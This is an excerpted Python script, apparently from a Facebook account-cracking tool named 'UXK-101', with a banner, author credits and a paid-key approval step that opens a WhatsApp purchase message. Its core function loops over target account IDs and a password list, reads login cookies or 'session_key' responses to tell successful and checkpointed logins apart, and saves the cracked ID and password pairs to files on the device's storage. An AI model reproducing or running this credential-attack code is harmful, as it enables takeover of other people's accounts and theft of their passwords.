...
while attemps < 12345677901:
    ...
    if username == 'UNIK' and password == 'UNIK123':
...
\033[1;95m88        88  8b        d8  88      a8P   
88        88   Y8,    ,8P   88    ,88'    
88        88    `8b  d8'    88  ,88"      
\033[1;92m88        88      Y88P      88,d88'       
88        88      d88b      8888"88,      
\033[1;94m88        88    ,8P  Y8,    88P   Y8b     
Y8a.    .a8P   d8'    `8b   88     "88,   
 `"Y8888Y"'   8P        Y8  88       Y8b  
                                          
                                          
---------------------------------------------
\033[1;92mAuthor    : UNIK BAAUU

 Github    : UNIK DON

 Facebook  : YUNICK EDITZ 
 
 \033[1;37mTool Name : \033[1;92mUXK-101
 \033[1;37m---------------------------------------------""")

def approval():
  uuid = str(os.geteuid())+"X9G"+str(os.geteuid())
  id = "UXK-1"+"01 "+"".join(uuid)
  os.system('clear')
  print(logo)
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                               ...
                               public()                      
                                ...
                                os.system(f'xdg-open https://www.facebook.com/YunickEditz');menu()
                                ...
                                if cpok in ['1','01']:
                                    os.system('clear')
                                    print(logo)
                                    open('/sdcard/UXK-OK.txt', 'a')
                                    animation(' >> Opening UXK-OK.txt')
                                    print('-------------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/UXK-OK.txt', 'r') as okids:
                                        okid = okids.read()
                                    ...
                                    os.system('clear')
                                    print(logo)
                                    open('/sdcard/UXK-CP.txt', 'a')
                                    animation(' >> Opening UXK-CP.txt')
                                    print('-------------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/UXK-CP.txt', 'r') as cpids:
                                        cpid = cpids.read()
                        ...
                        tks = ("Hi NIKHIL Sir, I Need To Buy Your Paid UXK PRO Tools Version 1.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                        print(' Run :  python UXK.py')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [UXK-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        UXK=session.cookies.get_dict().keys()
                        ...
                        if "c_user" in UXK:
                                ...
                                print('\r\r\033[1;32m [UXK-OK] %s | %s'%(ids,pas))

                                open('/sdcard/UXK-OK.txt', 'a').write(ids+'|'+pas+'\n')

                                oks.append(ids)

                                break

                        elif 'checkpoint' in UXK:

                                if 'y' in pcp:

                                        print('\r\r\x1b\033[1;33m [UXK-CP] '+ids+' | '+pas+'\033[1;33m')

                                        open('/sdcard/UXK-CP.txt', 'a').write(ids+'|'+pas+'\n')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [UXK-OK] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/UXK-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;95m [UXK-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/UXK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                ...
                                                print('\r\r\033[1;32m [UXK-OK] '+uid+' | '+pas+'\033[1;97m')
